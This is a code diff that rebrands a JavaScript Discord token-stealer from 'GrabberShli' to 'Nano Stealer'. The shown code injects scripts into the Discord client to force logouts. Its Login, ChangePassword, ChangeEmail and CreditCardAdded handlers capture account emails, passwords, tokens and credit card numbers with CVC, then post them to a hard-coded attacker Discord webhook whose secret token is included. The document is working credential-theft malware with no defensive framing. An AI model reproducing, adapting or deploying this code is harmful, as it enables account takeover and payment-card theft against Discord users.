@@ -6,10 +6,10 @@ const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push
 var webhook = "https://discord.com/api/webhooks/941012397844496404/8CVcMebPEVYfdY-8VbMdyCdmm41IH0wR05eOiiiPIUc1BbFgMhsnP-yQggHKrygPECU8";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "GrabberShli"))) {
+    if (!fs.existsSync(path.join(__dirname, "Nano Stealer"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "GrabberShli"));
+    fs.rmdirSync(path.join(__dirname, "Nano Stealer"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -140,30 +140,35 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "Nano Stealer",
             content: "",
             avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
             embeds: [
                 {
                     "color": 16507654,
                     "fields": [
-                        {
-                            "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
-                            "inline": true
-                        },
-                        {
+                        
+			{
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
+                        },
+			
+			
+			
+			{
+                            "name": "**Account Info**",
+                            "value": `Email: ${email} - Password: ${password}`,
+                            "inline": true
                         }
+                    
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337/"
+                        "text": "nano.sex"
                     }
                 }
             ]
@@ -182,7 +187,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "Nano Stealer",
             content: "",
             avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
             embeds: [
@@ -210,7 +215,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337/"
+                        "text": "nano.sex"
                     }                 
                 }
             ]
@@ -229,7 +234,7 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "Nano Stealer",
             content: "",
             avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
             embeds: [
@@ -257,7 +262,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337"
+                        "text": "nano.sex"
                     }                
                 }
             ]
@@ -276,7 +281,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "GrabberShli",
+            username: "Nano Stealer",
             content: "@everyone",
             avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
             embeds: [
@@ -304,7 +309,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "GrabberShli By Shlimazl#1337・https://github.com/shlimazl1337/"
+                        "text": "nano.sex"
                     }
                 }
             ]
